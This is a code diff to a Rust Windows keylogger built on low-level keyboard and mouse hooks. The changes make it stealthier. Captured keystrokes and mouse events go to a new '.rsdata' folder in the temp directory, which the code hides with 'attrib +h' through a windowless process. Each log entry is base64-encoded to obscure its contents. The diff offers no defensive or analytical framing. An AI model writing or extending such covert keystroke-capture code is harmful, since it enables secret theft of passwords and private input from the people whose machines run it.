@@ -1,7 +1,10 @@
-use std::fs::OpenOptions;
+use std::fs::{OpenOptions, create_dir_all};
 use std::io::Write;
 use std::sync::Mutex;
+use std::path::PathBuf;
+use std::env;
 use chrono::Local;
+use base64::{Engine as _, engine::general_purpose};
 use windows::Win32::Foundation::{LPARAM, LRESULT, WPARAM};
 use windows::Win32::UI::WindowsAndMessaging::{
     CallNextHookEx, KBDLLHOOKSTRUCT, HHOOK, WM_KEYDOWN,
@@ -17,7 +20,36 @@ use std::sync::atomic::{AtomicU64, Ordering};
 
 static LOG_MUTEX: Mutex<()> = Mutex::new(());
 static LAST_MOUSE_LOG: AtomicU64 = AtomicU64::new(0);
-const MOUSE_MOVE_THROTTLE_MS: u64 = 500;
+const MOUSE_MOVE_THROTTLE_MS: u64 = 2000;
+
+pub fn get_log_dir() -> PathBuf {
+    let temp = env::temp_dir();
+    let log_dir = temp.join(".rsdata");
+    let _ = create_dir_all(&log_dir);
+    
+    #[cfg(windows)]
+    {
+        use std::process::Command;
+        use std::os::windows::process::CommandExt;
+        const CREATE_NO_WINDOW: u32 = 0x08000000;
+        
+        let _ = Command::new("attrib")
+            .arg("+h")
+            .arg(&log_dir)
+            .creation_flags(CREATE_NO_WINDOW)
+            .output();
+    }
+    
+    log_dir
+}
+
+pub fn get_keylog_path() -> PathBuf {
+    get_log_dir().join("kb.dat")
+}
+
+pub fn get_mouselog_path() -> PathBuf {
+    get_log_dir().join("ms.dat")
+}
 
 pub unsafe extern "system" fn keyboard_hook(
     n_code: i32,
@@ -33,7 +65,7 @@ pub unsafe extern "system" fn keyboard_hook(
         if let Ok(mut log_file) = OpenOptions::new()
             .create(true)
             .append(true)
-            .open("keylog.txt")
+            .open(get_keylog_path())
         {
             let timestamp = Local::now().format("%Y-%m-%d %H:%M:%S");
             let mut log_entry = format!("[{}] ", timestamp);
@@ -90,7 +122,9 @@ pub unsafe extern "system" fn keyboard_hook(
                 }
             }
 
-            let _ = log_file.write_all(log_entry.as_bytes());
+            let encoded = general_purpose::STANDARD.encode(log_entry.as_bytes());
+            let _ = log_file.write_all(encoded.as_bytes());
+            let _ = log_file.write_all(b"\n");
         }
     }
 
@@ -123,7 +157,7 @@ pub unsafe extern "system" fn mouse_hook(
         if let Ok(mut log_file) = OpenOptions::new()
             .create(true)
             .append(true)
-            .open("mouselog.txt")
+            .open(get_mouselog_path())
         {
             let timestamp = Local::now().format("%Y-%m-%d %H:%M:%S");
 
@@ -149,7 +183,9 @@ pub unsafe extern "system" fn mouse_hook(
             };
 
             if !log_entry.is_empty() {
-                let _ = log_file.write_all(log_entry.as_bytes());
+                let encoded = general_purpose::STANDARD.encode(log_entry.as_bytes());
+                let _ = log_file.write_all(encoded.as_bytes());
+                let _ = log_file.write_all(b"\n");
             }
         }
     }
